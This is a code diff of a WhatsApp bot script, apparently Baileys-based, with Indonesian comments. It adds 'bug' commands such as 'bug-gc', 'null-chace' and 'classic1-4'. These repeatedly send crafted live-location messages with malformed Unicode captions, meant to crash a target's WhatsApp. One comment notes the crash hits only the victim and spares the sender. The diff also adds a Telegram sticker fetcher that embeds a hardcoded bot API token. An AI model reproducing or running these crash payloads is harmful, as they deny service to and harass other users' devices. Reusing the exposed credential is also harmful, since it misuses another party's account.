@@ -51,6 +51,7 @@ title: ` ◥◤◢◤ ★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?�
 }
 }
 }
+
 const force = {
 key: {
 participant: `0@s.whatsapp.net`,
@@ -76,19 +77,11 @@ remoteJid: ""
 }
 }
 
-const ryobug = {
-	key: {
-		remoteJid: 'status@broadcast',
-		fromMe: false, 
-		participant: '0@s.whatsapp.net'
-	},
-    message: {
-        listResponseMessage: {
-            title: `🎲 Classic Bugs 🤔 `
-        }
-    }
-}
-//================°
+
+
+
+
+//===========°
 const hmbug = async (target, txt) => {
   await sleep(300);
   var etc = {
@@ -420,7 +413,25 @@ await zetsubo.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
 }
 }
 	 
-
+async function Telesticker(url) {
+    return new Promise(async (resolve, reject) => {
+        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcxeon('Enther your url telegram sticker link')
+        packName = url.replace("https://t.me/addstickers/", "")
+        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
+        const xeonyresult = []
+        for (let i = 0; i < data.data.result.stickers.length; i++) {
+            fileId = data.data.result.stickers[i].thumb.file_id
+            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
+            result = {
+            status: 200,
+            author: 'DGXeon',
+            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
+            }
+            xeonyresult.push(result)
+        }
+    resolve(xeonyresult)
+    })
+}
 
 if (autodelete) {
 zetsubo.sendMessage(m.chat,
@@ -448,9 +459,9 @@ var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 viewOnceMessage: {
 message: {
   "liveLocationMessage": {
-    "degreesLatitude": "",
-    "degreesLongitude": "",
-    "caption": `Hey Bro 👋`,
+    "degreesLatitude": "🖤⟩ ༘྅Classic Bot Territory ꧏ🤍҈ ༑",
+    "degreesLongitude": "🖤⟩ ༘྅Lets Dance☆ ꧏ🤍҈ ༑",
+    "caption": `🖤⟩ ༘྅Booom 😅 ☆ ꧏ🤍҈ ༑`,
     "sequenceNumber": "9",
     "jpegThumbnail": ""
      }
@@ -459,7 +470,7 @@ message: {
 }), { userJid: m.chat, quoted: kuwoted })
 //await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id }) Gunakan Ini Jika Ingin Bug Keliatan Di Wa Pengirim
 await zetsubo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id }); //Gunakan Ini Jika Ingin Bug Hanya Terlihat Di Wa Target ( Benefit - WhatsApp pengguna tidak ikut crash )
-	 }
+	}
 
 /*let reactionMessage = {
                     react: {
@@ -918,6 +929,7 @@ await reply(`Successfully set Menu type to ${chosen} 🤩`)
 break
 //=================================================//
 case 'menu': case 'help': {
+await inireact()
 let messg = `
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
     \`𝘾𝙇𝘼𝙎𝙎𝙄𝘾-𝙑3 𝘽𝙐𝙂\`
@@ -933,6 +945,16 @@ let messg = `
     ✦ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
  
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+     ⦁𝐁𝐮𝐠𝐦𝐞𝐧𝐮
+     ⦁𝐎𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
+     ⦁𝐆𝐫𝐨𝐮𝐩𝐦𝐞𝐧𝐮
+     ⦁𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐦𝐞𝐧𝐮
+     ⦁𝐆𝐚𝐦𝐞𝐦𝐞𝐧𝐮
+     ⦁𝐥𝐢𝐬𝐭𝐦𝐮𝐬𝐢𝐤
+     ⦁𝐅𝐮𝐧𝐦𝐞𝐧𝐮
+     ⦁𝐀𝐝𝐝𝐦𝐞𝐧𝐮
+     ⦁𝐏𝐮𝐬𝐡𝐦𝐞𝐧𝐮
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬     
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 ©𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 `
 
@@ -2885,53 +2907,65 @@ zetsubo.sendFile(from, pp, "", m, { caption: tekse, mentions: await zetsubo.pars
 }
 break
 //=================================================
-case 'bugggg': {
-await inireact()
-if (isBan) return reply('*Lu Di Ban Owner*')
-joauuuuuuu = fs.readFileSync('./zetszet/video/hwmods2.mp4')
-zetsubo.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
+case 'plerku': case 'bug-gc': {
+if (! isCreator) return reply(mess.premium)
+if (!m.isGroup) return m.reply('Only In Group')
+if (!q) return joreply(`use .${command} 1`)
+for (let j = 0; j < q; j++) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `✳️᜴࿆͆᷍Classic̿╮⭑ ☠️⃰͜͡؜Virus⃟⭐️᜴▴Activatedཀ͜͡✅⃟╮.xp`,
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: force })
+await zetsubo.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
+}
+await reply('💊𝗧𝗮𝗿𝗴𝗲𝘁 𝗘𝗹𝗶𝗺𝗶𝗻𝗮𝘁𝗲𝗱 𝗯𝘆 Classic 📡')
 }
 break
 //=================================================
-case "welcome":
-await inireact()
-{
-if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-if (!m.isGroup) return reply('Make it in the Stupid Group')
-await inireact()
-if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
-if (args[0] === "on") {
-if (welcm) return reply('Sudah Aktif')
-wlcm.push(from)
-var groupe = await zetsubo.groupMetadata(from)
-var members = groupe['participants']
-var mems = []
-members.map(async adm => {
-mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
+case 'null-chace': {
+if (!isPremium) return joreply(mess.premium)
+if (!q) return joreply(`Use .${command} 1`)
+for (let j = 0; j < q; j++) {
+ngeloc(m.chat, force)
+}
+await reply('✅Succes')
+}
+break
+//=================================================
+case 'classic1': case 'classic2': case 'classic3': case 'classic4': {
+if (m.isGroup) return reply("Only In Private Chat")
+if (!isCreator) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
+}
+await zetsubo.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: ``,
+title: `𝕾𝖔𝖗𝖗𝖞 𝕭𝖗𝖔 𝕴 𝖌𝖔𝖙 𝕹𝖔 𝖒𝖊𝖗𝖈𝖞 𝖔𝖓 𝖞𝖔𝖚 🥵🙃`,
+body: `⁗ Classic 𝕰𝖑𝖎𝖒𝖎𝖓𝖆𝖙𝖊𝖘 📡`,
+previewType: "VIDEO",
+sourceUrl: `Classic 𝕾𝖚𝖈𝖐𝖘`,
+mediaType: 1,
+mediaUrl: `${global.url}`
+}
+},
+text: '📡𝗬𝗼𝘂 𝗖𝗮𝗻 𝗖𝗼𝗽𝘆 𝗕𝘂𝘁 𝗬𝗼𝘂 𝗖𝗮𝗻𝘁 𝗯𝗲 𝗠𝗲 🙃 𝗖𝗮𝗹𝗹 𝗠𝗲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 🩸'
+}, {
+quoted: m
 })
-zetsubo.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
-} else if (args[0] === "off") {
-if (!welcm) return reply('Sudah Non Aktif')
-let off = wlcm.indexOf(from)
-wlcm.splice(off, 1)
-reply('Sukses Mematikan Welcome  di group ini')
-}
-}
-break
-//=================================================
-case 'bcgc': case 'bcgroup': {
-if (!isCreator) return reply('*Premium Only*')
-await inireact()
-if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
-let getGroups = await zetsubo.groupFetchAllParticipating()
-let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
-let anu = groups.map(v => v.id)
-reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
-for (let i of anu) {
-await sleep(1500)
-zetsubo.sendMessage(i, {text: `${text}`}, {quoted:m})
-    }
-reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 }
 break
 //=================================================//
@@ -3515,61 +3549,25 @@ zetsubo.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted:m}
 }
 break
 //=================================================
-case 'rentbot':
-                reply(`Type ${prefix}owner and chat him`)
-                break
-            case 'speedtest': {
-                zetsubo('Testing Speed...')
-                let cp = require('child_process')
-                let {
-                    promisify
-                } = require('util')
-                let exec = promisify(cp.exec).bind(cp)
-                let o
-                try {
-                    o = await exec('python speed.py')
-                } catch (e) {
-                    o = e
-                } finally {
-                    let {
-                        stdout,
-                        stderr
-                    } = o
-                    if (stdout.trim()) zetsubo.sendMessage(m.chat, {
-                        text: stdout,
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnailUrl: 'https://ibb.co/VVLfc0Q/cheemspic.jpg',
-                                sourceUrl: wagc,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: m
-                    })
-                    if (stderr.trim()) zetsubo.sendMessage(m.chat, {
-                        text: stderr,
-                        contextInfo: {
-                            externalAdReply: {
-                                showAdAttribution: true,
-                                title: botname,
-                                body: ownername,
-                                thumbnailUrl: 'https://ibb.co/VVLfc0Q/cheemspic.jpg',
-                                sourceUrl: wagc,
-                                mediaType: 1,
-                                renderLargerThumbnail: true
-                            }
-                        }
-                    }, {
-                        quoted: m
-                    })
-                }
-            }
-            break
+case'telestick': {
+if (!isCreator) return reply(mess.owner)
+inireact()
+if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
+let xeonresources = await Telesticker(args[0])
+await reply(`Sending ${xeonresources.length} stickers...`)
+if (m.isGroup && xeonresources.length > 30) {
+await reply('Number of stickers more than 30, bot will send it in private chat.')
+for (let i = 0; i < xeonresources.length; i++) {
+zetsubo.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
+}
+} else {
+for (let i = 0; i < xeonresources.length; i++) {
+zetsubo.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
+}
+}
+} else reply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
+}
+break
 //=================================================
 case 'autostatusview':
                 if (!isCreator) return reply(`Successfully changed auto status/story view`)
@@ -4582,7 +4580,7 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     repo = repo.replace(/.git$/, '')
     let url = `https://api.github.com/repos/${user}/${repo}/zipball`
     let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
-    zetsubo.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
+    zetsubo.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
 break
 //=================================================//
 case 'sifat': case 'karakter': {
